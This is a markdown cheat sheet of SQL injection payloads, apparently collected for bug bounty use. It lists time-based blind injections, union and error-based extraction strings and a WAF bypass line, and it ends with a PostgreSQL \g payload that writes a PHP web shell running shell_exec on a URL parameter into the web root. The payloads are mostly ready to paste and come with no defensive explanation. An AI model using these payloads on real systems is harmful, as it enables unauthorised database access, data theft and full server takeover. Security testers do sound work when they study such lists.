# SQL Injection Payloads
## Time Based SQL Payloads
```sql
WAITFOR DELAY '0:0:5'
'XOR(if(now()=sysdate(),sleep(1*1),0))OR'
')orsleep(5)='
1))orsleep(5)#
"))orsleep(5)="
'))orsleep(5)='
;waitfor delay'0:0:5'--
);waitfor delay'0:0:5'--
';waitfor delay'0:0:5'--
";waitfor delay'0:0:5'--
');waitfor delay'0:0:5'--
");waitfor delay'0:0:5'--
));waitfor delay'0:0:5'--
{"param":"1")))+MySQL_payload--+--}
/**/WHEN(LENGTH(​version()​)=​10​)THEN(SLEEP(6*1))END
%2c(select*from(select(sleep(20)))a)
{{"sleep"%2c"13"})}${{"timeout"%2c"13"})
+UNION+SELECT+1,2,3,CONCAT(user(),version(),database()),5,6,7,8--+r0hack"}
{sleep(hexdec(dechex(13)))}${sleep(hexdec(dechex(13)))}
'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
'+(select*from(select(sleep(20)))a)+'
%20and%20(select%20*%20from%20(select(if(substring(user(),1,1)='p',sleep(5),1)))a)--%20 - true (sleeps 5 sec)
" AND (length(database())) = "11 --+-
```
## Other SQL Injection Payloads
```sql
+OR+1=insert(1,1,1,1)--
+OR+1=replace(1,1,1)--
{`foo`/*bar*/(select+1)\}'
{`foo`/*bar*/(select%2b2)}
{`foo`/*bar*/(select+1+from+wp_users+where+user_pass+rlike+"(^)[$].*"+limit+1)}
SELECT * FROM(SELECT COUNT(*),CONCAT(database(),'--',(SELECT (ELT(1=1,version()))),'--','_Y000!_',FLOOR(RAND(1)*1))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x) a
```
## Akami WAF Bypass
```sql
'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
```

## You can use the PostgreSQL \g command in your SQLi to create a file on the server. 
```sql
' UNION SELECT '<?php $out = shell_exec($_GET["x"]); echo "<pre>$out</pre>";?>' \g /var/www/test.php; --
```
**Example**<br>
[![img](https://pbs.twimg.com/media/EpNcPxHW8AEP2v1?format=jpg&name=large)](https://twitter.com/bugbountynights/status/1338515958567227393?s=20)
